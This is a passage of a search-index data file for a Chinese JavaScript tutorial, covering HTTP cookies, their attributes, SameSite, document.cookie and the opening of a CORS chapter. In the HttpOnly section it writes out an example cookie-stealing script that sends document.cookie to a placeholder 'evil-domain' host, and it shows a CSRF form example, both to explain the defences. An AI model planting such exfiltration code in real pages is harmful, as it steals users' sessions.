\u56de\u5e94\uff1aCookie \u7684\u751f\u6210"},{"location":"bom/cookie/#http-cookie_1","text":"\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u65f6\uff0c\u6bcf\u4e2a\u8bf7\u6c42\u90fd\u4f1a\u5e26\u4e0a\u76f8\u5e94\u7684 Cookie\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u628a\u670d\u52a1\u5668\u65e9\u524d\u4fdd\u5b58\u5728\u6d4f\u89c8\u5668\u7684\u8fd9\u6bb5\u4fe1\u606f\uff0c\u518d\u53d1\u56de\u670d\u52a1\u5668\u3002\u8fd9\u65f6\u8981\u4f7f\u7528 HTTP \u5934\u4fe1\u606f\u7684 Cookie \u5b57\u6bb5\u3002 1 Cookie: foo=bar \u4e0a\u9762\u4ee3\u7801\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u9001\u540d\u4e3a foo \u7684 Cookie\uff0c\u503c\u4e3a bar \u3002 Cookie \u5b57\u6bb5\u53ef\u4ee5\u5305\u542b\u591a\u4e2a Cookie\uff0c\u4f7f\u7528\u5206\u53f7\uff08 ; \uff09\u5206\u9694\u3002 1 Cookie: name=value; name2=value2; name3=value3 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 GET /sample_page.html HTTP / 1.1 Host : www.example.org Cookie : yummy_cookie=choco; tasty_cookie=strawberry \u670d\u52a1\u5668\u6536\u5230\u6d4f\u89c8\u5668\u53d1\u6765\u7684 Cookie \u65f6\uff0c\u6709\u4e24\u70b9\u662f\u65e0\u6cd5\u77e5\u9053\u7684\u3002 Cookie \u7684\u5404\u79cd\u5c5e\u6027\uff0c\u6bd4\u5982\u4f55\u65f6\u8fc7\u671f\u3002 \u54ea\u4e2a\u57df\u540d\u8bbe\u7f6e\u7684 Cookie\uff0c\u5230\u5e95\u662f\u4e00\u7ea7\u57df\u540d\u8bbe\u7684\uff0c\u8fd8\u662f\u67d0\u4e00\u4e2a\u4e8c\u7ea7\u57df\u540d\u8bbe\u7684\u3002","title":"HTTP \u8bf7\u6c42\uff1aCookie \u7684\u53d1\u9001"},{"location":"bom/cookie/#cookie_1","text":"","title":"Cookie \u7684\u5c5e\u6027"},{"location":"bom/cookie/#expiresmax-age","text":"Expires \u5c5e\u6027\u6307\u5b9a\u4e00\u4e2a\u5177\u4f53\u7684\u5230\u671f\u65f6\u95f4\uff0c\u5230\u4e86\u6307\u5b9a\u65f6\u95f4\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002\u5b83\u7684\u503c\u662f UTC \u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 Date.prototype.toUTCString() \u8fdb\u884c\u683c\u5f0f\u8f6c\u6362\u3002 1 Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; \u5982\u679c\u4e0d\u8bbe\u7f6e\u8be5\u5c5e\u6027\uff0c\u6216\u8005\u8bbe\u4e3a null \uff0cCookie \u53ea\u5728\u5f53\u524d\u4f1a\u8bdd\uff08session\uff09\u6709\u6548\uff0c\u6d4f\u89c8\u5668\u7a97\u53e3\u4e00\u65e6\u5173\u95ed\uff0c\u5f53\u524d Session \u7ed3\u675f\uff0c\u8be5 Cookie \u5c31\u4f1a\u88ab\u5220\u9664\u3002\u53e6\u5916\uff0c\u6d4f\u89c8\u5668\u6839\u636e\u672c\u5730\u65f6\u95f4\uff0c\u51b3\u5b9a Cookie \u662f\u5426\u8fc7\u671f\uff0c\u7531\u4e8e\u672c\u5730\u65f6\u95f4\u662f\u4e0d\u7cbe\u786e\u7684\uff0c\u6240\u4ee5\u6ca1\u6709\u529e\u6cd5\u4fdd\u8bc1 Cookie \u4e00\u5b9a\u4f1a\u5728\u670d\u52a1\u5668\u6307\u5b9a\u7684\u65f6\u95f4\u8fc7\u671f\u3002 Max-Age \u5c5e\u6027\u6307\u5b9a\u4ece\u73b0\u5728\u5f00\u59cb Cookie \u5b58\u5728\u7684\u79d2\u6570\uff0c\u6bd4\u5982 60 * 60 * 24 * 365 \uff08\u5373\u4e00\u5e74\uff09\u3002\u8fc7\u4e86\u8fd9\u4e2a\u65f6\u95f4\u4ee5\u540e\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002 \u5982\u679c\u540c\u65f6\u6307\u5b9a\u4e86 Expires \u548c Max-Age \uff0c\u90a3\u4e48 Max-Age \u7684\u503c\u5c06\u4f18\u5148\u751f\u6548\u3002 \u5982\u679c Set-Cookie \u5b57\u6bb5\u6ca1\u6709\u6307\u5b9a Expires \u6216 Max-Age \u5c5e\u6027\uff0c\u90a3\u4e48\u8fd9\u4e2a Cookie \u5c31\u662f Session Cookie\uff0c\u5373\u5b83\u53ea\u5728\u672c\u6b21\u5bf9\u8bdd\u5b58\u5728\uff0c\u4e00\u65e6\u7528\u6237\u5173\u95ed\u6d4f\u89c8\u5668\uff0c\u6d4f\u89c8\u5668\u5c31\u4e0d\u4f1a\u518d\u4fdd\u7559\u8fd9\u4e2a Cookie\u3002","title":"Expires\uff0cMax-Age"},{"location":"bom/cookie/#domainpath","text":"Domain \u5c5e\u6027\u6307\u5b9a Cookie \u5c5e\u4e8e\u54ea\u4e2a\u57df\u540d\uff0c\u4ee5\u540e\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 HTTP \u8bf7\u6c42\u65f6\uff0c\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u5224\u65ad\u662f\u5426\u8981\u9644\u5e26\u67d0\u4e2a Cookie\u3002 \u670d\u52a1\u5668\u8bbe\u5b9a Cookie \u65f6\uff0c\u5982\u679c\u6ca1\u6709\u6307\u5b9a Domain \u5c5e\u6027\uff0c\u6d4f\u89c8\u5668\u4f1a\u9ed8\u8ba4\u5c06\u5176\u8bbe\u4e3a\u6d4f\u89c8\u5668\u7684\u5f53\u524d\u57df\u540d\u3002\u5982\u679c\u5f53\u524d\u57df\u540d\u662f\u4e00\u4e2a IP \u5730\u5740\uff0c\u5219\u4e0d\u5f97\u8bbe\u7f6e Domain \u5c5e\u6027\u3002 \u5982\u679c\u6307\u5b9a Domain \u5c5e\u6027\uff0c\u9700\u8981\u9075\u5b88\u4e0b\u9762\u89c4\u5219\uff1aDomain \u5c5e\u6027\u53ea\u80fd\u662f\u5f53\u524d\u57df\u540d\u6216\u8005\u5f53\u524d\u57df\u540d\u7684\u4e0a\u7ea7\u57df\u540d\uff0c\u4f46\u8bbe\u4e3a\u4e0a\u7ea7\u57df\u540d\u65f6\uff0c\u4e0d\u80fd\u8bbe\u4e3a\u9876\u7ea7\u57df\u540d\u6216\u516c\u5171\u57df\u540d\u3002\uff08\u9876\u7ea7\u57df\u540d\u6307\u7684\u662f .com\u3001.net \u8fd9\u6837\u7684\u57df\u540d\uff0c\u516c\u5171\u57df\u540d\u6307\u7684\u662f\u5f00\u653e\u7ed9\u5916\u90e8\u7528\u6237\u8bbe\u7f6e\u5b50\u57df\u540d\u7684\u57df\u540d\uff0c\u6bd4\u5982 github.io\u3002\uff09\u5982\u679c\u4e0d\u7b26\u5408\u4e0a\u9762\u8fd9\u6761\u89c4\u5219\uff0c\u6d4f\u89c8\u5668\u4f1a\u62d2\u7edd\u8bbe\u7f6e\u8fd9\u4e2a Cookie\u3002 \u4e3e\u4f8b\u6765\u8bf4\uff0c\u5f53\u524d\u57df\u540d\u4e3a x.y.z.com \uff0c\u90a3\u4e48 Domain \u5c5e\u6027\u53ef\u4ee5\u8bbe\u4e3a x.y.z.com \uff0c\u6216\u8005 y.z.com \uff0c\u6216\u8005 z.com \uff0c\u4f46\u4e0d\u80fd\u8bbe\u4e3a foo.x.y.z.com \uff0c\u6216\u8005 another.domain.com \u3002 \u53e6\u4e00\u4e2a\u4f8b\u5b50\u662f\uff0c\u5f53\u524d\u57df\u540d\u4e3a wangdoc.github.io \uff0c\u5219 Domain \u5c5e\u6027\u53ea\u80fd\u8bbe\u4e3a wangdoc.github.io \uff0c\u4e0d\u80fd\u8bbe\u4e3a github.io \uff0c\u56e0\u4e3a\u540e\u8005\u662f\u4e00\u4e2a\u516c\u5171\u57df\u540d\u3002 \u6d4f\u89c8\u5668\u53d1\u9001 Cookie \u65f6\uff0cDomain \u5c5e\u6027\u5fc5\u987b\u4e0e\u5f53\u524d\u57df\u540d\u4e00\u81f4\uff0c\u6216\u8005\u662f\u5f53\u524d\u57df\u540d\u7684\u4e0a\u7ea7\u57df\u540d\uff08\u516c\u5171\u57df\u540d\u9664\u5916\uff09\u3002\u6bd4\u5982\uff0cDomain \u5c5e\u6027\u662f y.z.com \uff0c\u90a3\u4e48\u9002\u7528\u4e8e y.z.com \u3001 x.y.z.com \u3001 foo.x.y.z.com \u7b49\u57df\u540d\u3002\u518d\u6bd4\u5982\uff0cDomain \u5c5e\u6027\u662f\u516c\u5171\u57df\u540d github.io \uff0c\u90a3\u4e48\u53ea\u9002\u7528\u4e8e github.io \u8fd9\u4e2a\u57df\u540d\u672c\u8eab\uff0c\u4e0d\u9002\u7528\u4e8e\u5b83\u7684\u5b50\u57df\u540d wangdoc.github.io \u3002 Path \u5c5e\u6027\u6307\u5b9a\u6d4f\u89c8\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u65f6\uff0c\u54ea\u4e9b\u8def\u5f84\u8981\u9644\u5e26\u8fd9\u4e2a Cookie\u3002\u53ea\u8981\u6d4f\u89c8\u5668\u53d1\u73b0\uff0c Path \u5c5e\u6027\u662f HTTP \u8bf7\u6c42\u8def\u5f84\u7684\u5f00\u5934\u4e00\u90e8\u5206\uff0c\u5c31\u4f1a\u5728\u5934\u4fe1\u606f\u91cc\u9762\u5e26\u4e0a\u8fd9\u4e2a Cookie\u3002\u6bd4\u5982\uff0c Path \u5c5e\u6027\u662f / \uff0c\u90a3\u4e48\u8bf7\u6c42 /docs \u8def\u5f84\u4e5f\u4f1a\u5305\u542b\u8be5 Cookie\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f Domain \u5c5e\u6027\u5fc5\u987b\u7b26\u5408\u6761\u4ef6\u3002","title":"Domain\uff0cPath"},{"location":"bom/cookie/#securehttponly","text":"Secure \u5c5e\u6027\u6307\u5b9a\u6d4f\u89c8\u5668\u53ea\u6709\u5728\u52a0\u5bc6\u534f\u8bae HTTPS \u4e0b\uff0c\u624d\u80fd\u5c06\u8fd9\u4e2a Cookie \u53d1\u9001\u5230\u670d\u52a1\u5668\u3002\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u5f53\u524d\u534f\u8bae\u662f HTTP\uff0c\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5ffd\u7565\u670d\u52a1\u5668\u53d1\u6765\u7684 Secure \u5c5e\u6027\u3002\u8be5\u5c5e\u6027\u53ea\u662f\u4e00\u4e2a\u5f00\u5173\uff0c\u4e0d\u9700\u8981\u6307\u5b9a\u503c\u3002\u5982\u679c\u901a\u4fe1\u662f HTTPS \u534f\u8bae\uff0c\u8be5\u5f00\u5173\u81ea\u52a8\u6253\u5f00\u3002 HttpOnly \u5c5e\u6027\u6307\u5b9a\u8be5 Cookie \u65e0\u6cd5\u901a\u8fc7 JavaScript \u811a\u672c\u62ff\u5230\uff0c\u4e3b\u8981\u662f document.cookie \u5c5e\u6027\u3001 XMLHttpRequest \u5bf9\u8c61\u548c Request API \u90fd\u62ff\u4e0d\u5230\u8be5\u5c5e\u6027\u3002\u8fd9\u6837\u5c31\u9632\u6b62\u4e86\u8be5 Cookie \u88ab\u811a\u672c\u8bfb\u5230\uff0c\u53ea\u6709\u6d4f\u89c8\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u65f6\uff0c\u624d\u4f1a\u5e26\u4e0a\u8be5 Cookie\u3002 1 ( new Image ()). src = \"http://www.evil-domain.com/steal-cookie.php?cookie=\" + document . cookie ; \u4e0a\u9762\u662f\u8de8\u7ad9\u70b9\u8f7d\u5165\u7684\u4e00\u4e2a\u6076\u610f\u811a\u672c\u7684\u4ee3\u7801\uff0c\u80fd\u591f\u5c06\u5f53\u524d\u7f51\u9875\u7684 Cookie \u53d1\u5f80\u7b2c\u4e09\u65b9\u670d\u52a1\u5668\u3002\u5982\u679c\u8bbe\u7f6e\u4e86\u4e00\u4e2a Cookie \u7684 HttpOnly \u5c5e\u6027\uff0c\u4e0a\u9762\u4ee3\u7801\u5c31\u4e0d\u4f1a\u8bfb\u5230\u8be5 Cookie\u3002","title":"Secure\uff0cHttpOnly"},{"location":"bom/cookie/#samesite","text":"Chrome 51 \u5f00\u59cb\uff0c\u6d4f\u89c8\u5668\u7684 Cookie \u65b0\u589e\u52a0\u4e86\u4e00\u4e2a SameSite \u5c5e\u6027\uff0c\u7528\u6765\u9632\u6b62 CSRF \u653b\u51fb\u548c\u7528\u6237\u8ffd\u8e2a\u3002 Cookie \u5f80\u5f80\u7528\u6765\u5b58\u50a8\u7528\u6237\u7684\u8eab\u4efd\u4fe1\u606f\uff0c\u6076\u610f\u7f51\u7ad9\u53ef\u4ee5\u8bbe\u6cd5\u4f2a\u9020\u5e26\u6709\u6b63\u786e Cookie \u7684 HTTP \u8bf7\u6c42\uff0c\u8fd9\u5c31\u662f CSRF \u653b\u51fb\u3002\u4e3e\u4f8b\u6765\u8bf4\uff0c\u7528\u6237\u767b\u9646\u4e86\u94f6\u884c\u7f51\u7ad9 your-bank.com \uff0c\u94f6\u884c\u670d\u52a1\u5668\u53d1\u6765\u4e86\u4e00\u4e2a Cookie\u3002 1 Set-Cookie:id=a3fWa; \u7528\u6237\u540e\u6765\u53c8\u8bbf\u95ee\u4e86\u6076\u610f\u7f51\u7ad9 malicious.com \uff0c\u4e0a\u9762\u6709\u4e00\u4e2a\u8868\u5355\u3002 1 2 3 < form action = \"your-bank.com/transfer\" method = \"POST\" > ... </ form > \u7528\u6237\u4e00\u65e6\u88ab\u8bf1\u9a97\u53d1\u9001\u8fd9\u4e2a\u8868\u5355\uff0c\u94f6\u884c\u7f51\u7ad9\u5c31\u4f1a\u6536\u5230\u5e26\u6709\u6b63\u786e Cookie \u7684\u8bf7\u6c42\u3002\u4e3a\u4e86\u9632\u6b62\u8fd9\u79cd\u653b\u51fb\uff0c\u5b98\u7f51\u7684\u8868\u5355\u4e00\u822c\u90fd\u5e26\u6709\u4e00\u4e2a\u968f\u673a token\uff0c\u5b98\u7f51\u670d\u52a1\u5668\u901a\u8fc7\u9a8c\u8bc1\u8fd9\u4e2a\u968f\u673a token\uff0c\u786e\u8ba4\u662f\u5426\u4e3a\u771f\u5b9e\u8bf7\u6c42\u3002 1 2 3 4 < form action = \"your-bank.com/transfer\" method = \"POST\" > < input type = \"hidden\" name = \"token\" value = \"dad3weg34\" > ... </ form > \u8fd9\u79cd\u7b2c\u4e09\u65b9\u7f51\u7ad9\u5f15\u5bfc\u800c\u9644\u5e26\u53d1\u9001\u7684 Cookie\uff0c\u5c31\u79f0\u4e3a\u7b2c\u4e09\u65b9 Cookie\u3002\u5b83\u9664\u4e86\u7528\u4e8e CSRF \u653b\u51fb\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8e\u7528\u6237\u8ffd\u8e2a\u3002\u6bd4\u5982\uff0cFacebook \u5728\u7b2c\u4e09\u65b9\u7f51\u7ad9\u63d2\u5165\u4e00\u5f20\u770b\u4e0d\u89c1\u7684\u56fe\u7247\u3002 1 < img src = \"facebook.com\" style = \"visibility:hidden;\" > \u6d4f\u89c8\u5668\u52a0\u8f7d\u4e0a\u9762\u4ee3\u7801\u65f6\uff0c\u5c31\u4f1a\u5411 Facebook \u53d1\u51fa\u5e26\u6709 Cookie \u7684\u8bf7\u6c42\uff0c\u4ece\u800c Facebook \u5c31\u4f1a\u77e5\u9053\u4f60\u662f\u8c01\uff0c\u8bbf\u95ee\u4e86\u4ec0\u4e48\u7f51\u7ad9\u3002 Cookie \u7684 SameSite \u5c5e\u6027\u7528\u6765\u9650\u5236\u7b2c\u4e09\u65b9 Cookie\uff0c\u4ece\u800c\u51cf\u5c11\u5b89\u5168\u98ce\u9669\u3002\u5b83\u53ef\u4ee5\u8bbe\u7f6e\u4e09\u4e2a\u503c\u3002 Strict Lax None \uff081\uff09Strict Strict \u6700\u4e3a\u4e25\u683c\uff0c\u5b8c\u5168\u7981\u6b62\u7b2c\u4e09\u65b9 Cookie\uff0c\u8de8\u7ad9\u70b9\u65f6\uff0c\u4efb\u4f55\u60c5\u51b5\u4e0b\u90fd\u4e0d\u4f1a\u53d1\u9001 Cookie\u3002\u6362\u8a00\u4e4b\uff0c\u53ea\u6709\u5f53\u524d\u7f51\u9875\u7684 URL \u4e0e\u8bf7\u6c42\u76ee\u6807\u4e00\u81f4\uff0c\u624d\u4f1a\u5e26\u4e0a Cookie\u3002 1 Set-Cookie: CookieName=CookieValue; SameSite=Strict; \u8fd9\u4e2a\u89c4\u5219\u8fc7\u4e8e\u4e25\u683c\uff0c\u53ef\u80fd\u9020\u6210\u975e\u5e38\u4e0d\u597d\u7684\u7528\u6237\u4f53\u9a8c\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u7f51\u9875\u6709\u4e00\u4e2a GitHub \u94fe\u63a5\uff0c\u7528\u6237\u70b9\u51fb\u8df3\u8f6c\u5c31\u4e0d\u4f1a\u5e26\u6709 GitHub \u7684 Cookie\uff0c\u8df3\u8f6c\u8fc7\u53bb\u603b\u662f\u672a\u767b\u9646\u72b6\u6001\u3002 \uff082\uff09Lax Lax \u89c4\u5219\u7a0d\u7a0d\u653e\u5bbd\uff0c\u5927\u591a\u6570\u60c5\u51b5\u4e5f\u662f\u4e0d\u53d1\u9001\u7b2c\u4e09\u65b9 Cookie\uff0c\u4f46\u662f\u5bfc\u822a\u5230\u76ee\u6807\u7f51\u5740\u7684 Get \u8bf7\u6c42\u9664\u5916\u3002 1 Set-Cookie: CookieName=CookieValue; SameSite=Lax; \u5bfc\u822a\u5230\u76ee\u6807\u7f51\u5740\u7684 GET \u8bf7\u6c42\uff0c\u53ea\u5305\u62ec\u4e09\u79cd\u60c5\u51b5\uff1a\u94fe\u63a5\uff0c\u9884\u52a0\u8f7d\u8bf7\u6c42\uff0cGET \u8868\u5355\u3002\u8be6\u89c1\u4e0b\u8868\u3002 \u8bf7\u6c42\u7c7b\u578b \u793a\u4f8b \u6b63\u5e38\u60c5\u51b5 Lax \u94fe\u63a5 <a href=\"...\"></a> \u53d1\u9001 Cookie \u53d1\u9001 Cookie \u9884\u52a0\u8f7d <link rel=\"prerender\" href=\"...\"/> \u53d1\u9001 Cookie \u53d1\u9001 Cookie GET \u8868\u5355 <form method=\"GET\" action=\"...\"> \u53d1\u9001 Cookie \u53d1\u9001 Cookie POST \u8868\u5355 <form method=\"POST\" action=\"...\"> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 iframe <iframe src=\"...\"></iframe> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 AJAX $.get(\"...\") \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 Image <img src=\"...\"> \u53d1\u9001 Cookie \u4e0d\u53d1\u9001 \u8bbe\u7f6e\u4e86 Strict \u6216 Lax \u4ee5\u540e\uff0c\u57fa\u672c\u5c31\u675c\u7edd\u4e86 CSRF \u653b\u51fb\u3002\u5f53\u7136\uff0c\u524d\u63d0\u662f\u7528\u6237\u6d4f\u89c8\u5668\u652f\u6301 SameSite \u5c5e\u6027\u3002 \uff083\uff09None Chrome \u8ba1\u5212\u5c06 Lax \u53d8\u4e3a\u9ed8\u8ba4\u8bbe\u7f6e\u3002\u8fd9\u65f6\uff0c\u7f51\u7ad9\u53ef\u4ee5\u9009\u62e9\u663e\u5f0f\u5173\u95ed SameSite \u5c5e\u6027\uff0c\u5c06\u5176\u8bbe\u4e3a None \u3002\u4e0d\u8fc7\uff0c\u524d\u63d0\u662f\u5fc5\u987b\u540c\u65f6\u8bbe\u7f6e Secure \u5c5e\u6027\uff08Cookie \u53ea\u80fd\u901a\u8fc7 HTTPS \u534f\u8bae\u53d1\u9001\uff09\uff0c\u5426\u5219\u65e0\u6548\u3002 \u4e0b\u9762\u7684\u8bbe\u7f6e\u65e0\u6548\u3002 1 Set-Cookie: widget_session=abc123; SameSite=None \u4e0b\u9762\u7684\u8bbe\u7f6e\u6709\u6548\u3002 1 Set-Cookie: widget_session=abc123; SameSite=None; Secure","title":"SameSite"},{"location":"bom/cookie/#documentcookie","text":"document.cookie \u5c5e\u6027\u7528\u4e8e\u8bfb\u5199\u5f53\u524d\u7f51\u9875\u7684 Cookie\u3002 \u8bfb\u53d6\u7684\u65f6\u5019\uff0c\u5b83\u4f1a\u8fd4\u56de\u5f53\u524d\u7f51\u9875\u7684\u6240\u6709 Cookie\uff0c\u524d\u63d0\u662f\u8be5 Cookie \u4e0d\u80fd\u6709 HTTPOnly \u5c5e\u6027\u3002 1 document . cookie // \"foo=bar;baz=bar\" \u4e0a\u9762\u4ee3\u7801\u4ece document.cookie \u4e00\u6b21\u6027\u8bfb\u51fa\u4e24\u4e2a Cookie\uff0c\u5b83\u4eec\u4e4b\u95f4\u4f7f\u7528\u5206\u53f7\u5206\u9694\u3002\u5fc5\u987b\u624b\u52a8\u8fd8\u539f\uff0c\u624d\u80fd\u53d6\u51fa\u6bcf\u4e00\u4e2a Cookie \u7684\u503c\u3002 1 2 3 4 5 6 7 var cookies = document . cookie . split ( ';' ); for ( var i = 0 ; i < cookies . length ; i ++ ) { console . log ( cookies [ i ]); } // foo=bar // baz=bar document.cookie \u5c5e\u6027\u662f\u53ef\u5199\u7684\uff0c\u53ef\u4ee5\u901a\u8fc7\u5b83\u4e3a\u5f53\u524d\u7f51\u7ad9\u6dfb\u52a0 Cookie\u3002 1 document . cookie = 'fontSize=14' ; \u5199\u5165\u7684\u65f6\u5019\uff0cCookie \u7684\u503c\u5fc5\u987b\u5199\u6210 key=value \u7684\u5f62\u5f0f\u3002\u6ce8\u610f\uff0c\u7b49\u53f7\u4e24\u8fb9\u4e0d\u80fd\u6709\u7a7a\u683c\u3002\u53e6\u5916\uff0c\u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u5fc5\u987b\u5bf9\u5206\u53f7\u3001\u9017\u53f7\u548c\u7a7a\u683c\u8fdb\u884c\u8f6c\u4e49\uff08\u5b83\u4eec\u90fd\u4e0d\u5141\u8bb8\u4f5c\u4e3a Cookie \u7684\u503c\uff09\uff0c\u8fd9\u53ef\u4ee5\u7528 encodeURIComponent \u65b9\u6cd5\u8fbe\u5230\u3002 \u4f46\u662f\uff0c document.cookie \u4e00\u6b21\u53ea\u80fd\u5199\u5165\u4e00\u4e2a Cookie\uff0c\u800c\u4e14\u5199\u5165\u5e76\u4e0d\u662f\u8986\u76d6\uff0c\u800c\u662f\u6dfb\u52a0\u3002 1 2 3 4 document . cookie = 'test1=hello' ; document . cookie = 'test2=world' ; document . cookie // test1=hello;test2=world document.cookie \u8bfb\u5199\u884c\u4e3a\u7684\u5dee\u5f02\uff08\u4e00\u6b21\u53ef\u4ee5\u8bfb\u51fa\u5168\u90e8 Cookie\uff0c\u4f46\u662f\u53ea\u80fd\u5199\u5165\u4e00\u4e2a Cookie\uff09\uff0c\u4e0e HTTP \u534f\u8bae\u7684 Cookie \u901a\u4fe1\u683c\u5f0f\u6709\u5173\u3002\u6d4f\u89c8\u5668\u5411\u670d\u52a1\u5668\u53d1\u9001 Cookie \u7684\u65f6\u5019\uff0c Cookie \u5b57\u6bb5\u662f\u4f7f\u7528\u4e00\u884c\u5c06\u6240\u6709 Cookie \u5168\u90e8\u53d1\u9001\uff1b\u670d\u52a1\u5668\u5411\u6d4f\u89c8\u5668\u8bbe\u7f6e Cookie \u7684\u65f6\u5019\uff0c Set-Cookie \u5b57\u6bb5\u662f\u4e00\u884c\u8bbe\u7f6e\u4e00\u4e2a Cookie\u3002 \u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u53ef\u4ee5\u4e00\u8d77\u5199\u5165 Cookie \u7684\u5c5e\u6027\u3002 1 document . cookie = \"foo=bar; expires=Fri, 31 Dec 2020 23:59:59 GMT\" ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5199\u5165 Cookie \u7684\u65f6\u5019\uff0c\u540c\u65f6\u8bbe\u7f6e\u4e86 expires \u5c5e\u6027\u3002\u5c5e\u6027\u503c\u7684\u7b49\u53f7\u4e24\u8fb9\uff0c\u4e5f\u662f\u4e0d\u80fd\u6709\u7a7a\u683c\u7684\u3002 \u5404\u4e2a\u5c5e\u6027\u7684\u5199\u5165\u6ce8\u610f\u70b9\u5982\u4e0b\u3002 path \u5c5e\u6027\u5fc5\u987b\u4e3a\u7edd\u5bf9\u8def\u5f84\uff0c\u9ed8\u8ba4\u4e3a\u5f53\u524d\u8def\u5f84\u3002 domain \u5c5e\u6027\u503c\u5fc5\u987b\u662f\u5f53\u524d\u53d1\u9001 Cookie \u7684\u57df\u540d\u7684\u4e00\u90e8\u5206\u3002\u6bd4\u5982\uff0c\u5f53\u524d\u57df\u540d\u662f example.com \uff0c\u5c31\u4e0d\u80fd\u5c06\u5176\u8bbe\u4e3a foo.com \u3002\u8be5\u5c5e\u6027\u9ed8\u8ba4\u4e3a\u5f53\u524d\u7684\u4e00\u7ea7\u57df\u540d\uff08\u4e0d\u542b\u4e8c\u7ea7\u57df\u540d\uff09\u3002 max-age \u5c5e\u6027\u7684\u503c\u4e3a\u79d2\u6570\u3002 expires \u5c5e\u6027\u7684\u503c\u4e3a UTC \u683c\u5f0f\uff0c\u53ef\u4ee5\u4f7f\u7528 Date.prototype.toUTCString() \u8fdb\u884c\u65e5\u671f\u683c\u5f0f\u8f6c\u6362\u3002 document.cookie \u5199\u5165 Cookie \u7684\u4f8b\u5b50\u5982\u4e0b\u3002 1 2 3 4 document . cookie = 'fontSize=14; ' + 'expires=' + someDate . toGMTString () + '; ' + 'path=/subdirectory; ' + 'domain=*.example.com' ; Cookie \u7684\u5c5e\u6027\u4e00\u65e6\u8bbe\u7f6e\u5b8c\u6210\uff0c\u5c31\u6ca1\u6709\u529e\u6cd5\u8bfb\u53d6\u8fd9\u4e9b\u5c5e\u6027\u7684\u503c\u3002 \u5220\u9664\u4e00\u4e2a\u73b0\u5b58 Cookie \u7684\u552f\u4e00\u65b9\u6cd5\uff0c\u662f\u8bbe\u7f6e\u5b83\u7684 expires \u5c5e\u6027\u4e3a\u4e00\u4e2a\u8fc7\u53bb\u7684\u65e5\u671f\u3002 1 document . cookie = 'fontSize=;expires=Thu, 01-Jan-1970 00:00:01 GMT' ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u540d\u4e3a fontSize \u7684 Cookie \u7684\u503c\u4e3a\u7a7a\uff0c\u8fc7\u671f\u65f6\u95f4\u8bbe\u4e3a1970\u5e741\u67081\u6708\u96f6\u70b9\uff0c\u5c31\u7b49\u540c\u4e8e\u5220\u9664\u4e86\u8fd9\u4e2a Cookie\u3002","title":"document.cookie"},{"location":"bom/cookie/#_2","text":"HTTP cookies , by MDN Using the Same-Site Cookie Attribute to Prevent CSRF Attacks SameSite cookies explained Tough Cookies , Scott Helme Cross-Site Request Forgery is dead! , Scott Helme","title":"\u53c2\u8003\u94fe\u63a5"},{"location":"bom/cors/","text":"CORS \u901a\u4fe1 \u00b6 CORS \u662f\u4e00\u4e2a W3C \u6807\u51c6\uff0c\u5168\u79f0\u662f\u201c\u8de8\u57df\u8d44\u6e90\u5171\u4eab\u201d\uff08Cross-origin resource sharing\uff09\u3002\u5b83\u5141\u8bb8\u6d4f\u89c8\u5668\u5411\u8de8\u57df\u7684\u670d\u52a1\u5668\uff0c\u53d1\u51fa XMLHttpRequest \u8bf7\u6c42\uff0c\u4ece\u800c\u514b\u670d\u4e86 AJAX \u53ea\u80fd\u540c\u6e90\u4f7f\u7528\u7684\u9650\u5236\u3002 \u7b80\u4ecb \u00b6 CORS \u9700\u8981\u6d4f\u89c8\u5668\u548c\u670d\u52a1\u5668\u540c\u65f6\u652f\u6301\u3002\u76ee\u524d\uff0c\u6240\u6709\u6d4f\u89c8\u5668\u90fd\u652f\u6301\u8be5\u529f\u80fd\u3002 \u6574\u4e2a CORS \u901a\u4fe1\u8fc7\u7a0b\uff0c\u90fd\u662f\u6d4f\u89c8\u5668\u81ea\u52a8\u5b8c\u6210\uff0c\u4e0d\u9700\u8981\u7528\u6237\u53c2\u4e0e\u3002\u5bf9\u4e8e\u5f00\u53d1\u8005\u6765\u8bf4\uff0cCORS \u901a\u4fe1\u4e0e\u666e\u901a\u7684 AJAX \u901a\u4fe1\u6ca1\u6709\u5dee\u522b\uff0c\u4ee3\u7801\u5b8c\u5168\u4e00\u6837\u3002\u6d4f\u89c8\u5668\u4e00\u65e6\u53d1\u73b0 AJAX \u8bf7\u6c42\u8de8\u57df\uff0c\u5c31\u4f1a\u81ea\u52a8\u6dfb\u52a0\u4e00\u4e9b\u9644\u52a0\u7684\u5934\u4fe1\u606f\uff0c\u6709\u65f6\u8fd8\u4f1a\u591a\u51fa\u4e00\u6b21\u9644\u52a0\u7684\u8bf7\u6c42\uff0c\u4f46\u7528\u6237\u4e0d\u4f1a\u6709\u611f\u77e5\u3002\u56e0\u6b64\uff0c\u5b9e\u73b0 CORS \u901a\u4fe1\u7684\u5173\u952e\u662f\u670d\u52a1\u5668\u3002\u53ea\u8981\u670d\u52a1\u5668\u5b9e\u73b0\u4e86 CORS \u63a5\u53e3\uff0c\u5c31\u53ef\u4ee5\u8de8\u57df\u901a\u4fe1\u3002 \u4e24\u79cd\u8bf7\u6c42 \u00b6 CORS 